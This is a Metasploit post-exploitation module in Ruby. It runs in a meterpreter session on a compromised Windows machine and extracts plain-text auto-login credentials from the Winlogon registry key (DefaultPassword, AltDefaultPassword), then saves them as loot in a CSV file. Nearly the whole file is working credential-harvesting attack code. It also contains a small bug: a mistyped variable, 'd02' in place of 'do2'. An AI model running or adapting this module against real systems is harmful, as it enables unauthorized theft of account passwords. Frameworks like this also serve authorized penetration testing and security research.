##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather AutoLogin User Credential Extractor',
        'Description'   => %q{
          This module extracts the plain-text Windows user login password in Registry.
          It exploits a Windows feature that Windows (2000 to 2008 R2) allows a
          user or third-party Windows Utility tools to configure User AutoLogin via
          plain-text password insertion in (Alt)DefaultPassword field in the registry
          location - HKLM\\Software\\Microsoft\\Windows NT\\WinLogon. This is readable
          by all users.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Myo Soe' #YGN Ethical Hacker Group, http://yehg.net
          ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ],
        'References'     =>
        [
          [ 'URL', 'http://support.microsoft.com/kb/315231' ],
          [ 'URL', 'http://core.yehg.net/lab/#tools.exploits' ]
        ]
    ))
  end


  def run

    host_name = sysinfo['Computer']
    print_status("Running against #{host_name} on session #{datastore['SESSION']}")

    creds = Rex::Ui::Text::Table.new(
      'Header'  => 'Windows AutoLogin Password',
      'Indent'   => 1,
      'Columns' => [
        'UserName',
        'Password',
        'Domain'
      ]
    )

    has_al = 0

    # DefaultDomainName, DefaultUserName, DefaultPassword
    # AltDefaultDomainName, AltDefaultUserName, AltDefaultPassword
    logon_key = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\"
    al = registry_getvaldata(logon_key, "AutoAdminLogon")        || ''

    do1 = registry_getvaldata(logon_key, "DefaultDomainName")    || ''
    du1 = registry_getvaldata(logon_key, "DefaultUserName")      || ''
    dp1 = registry_getvaldata(logon_key, "DefaultPassword")      || ''

    do2 = registry_getvaldata(logon_key, "AltDefaultDomainName") || ''
    du2 = registry_getvaldata(logon_key, "AltDefaultUserName")   || ''
    dp2 = registry_getvaldata(logon_key, "AltDefaultPassword")   || ''

    if do1 != '' and  du1 != '' and dp1 == '' and al == '1'
      has_al = 1
      dp1 = '[No Password!]'
      creds << [du1,dp1, do1]
      print_good("DefaultDomain=#{do1}, DefaultUser=#{du1}, DefaultPassword=#{dp1}")
    elsif do1 != '' and  du1 != '' and dp1 != ''
      has_al = 1
      creds << [du1,dp1, do1]
      print_good("DefaultDomain=#{do1}, DefaultUser=#{du1}, DefaultPassword=#{dp1}")
    end

    if do2 != '' and  du2 != '' and dp2 == '' and al == '1'
      has_al = 1
      dp2 = '[No Password!]'
      creds << [du2,dp2,d02]
      print_good("AltDomain=#{do2}, AltUser=#{du2}, AltPassword=#{dp2}")
    elsif do2 != '' and  du2 != '' and dp2 != ''
      has_al = 1
      creds << [du2,dp2,do2]
      print_good("AltDomain=#{do2}, AltUser=#{du2}, AltPassword=#{dp2}")
    end

    if has_al == 0
      print_status("The Host #{host_name} is not configured to have AutoLogon password")
      return
    end

    print_status("Storing data...")
    path = store_loot(
      'windows.autologin.user.creds',
      'text/csv',
      session,
      creds.to_csv,
      'windows-autologin-user-creds.csv',
      'Windows AutoLogin User Credentials'
    )

    print_status("Windows AutoLogin User Credentials saved in: #{path}")
  end
end
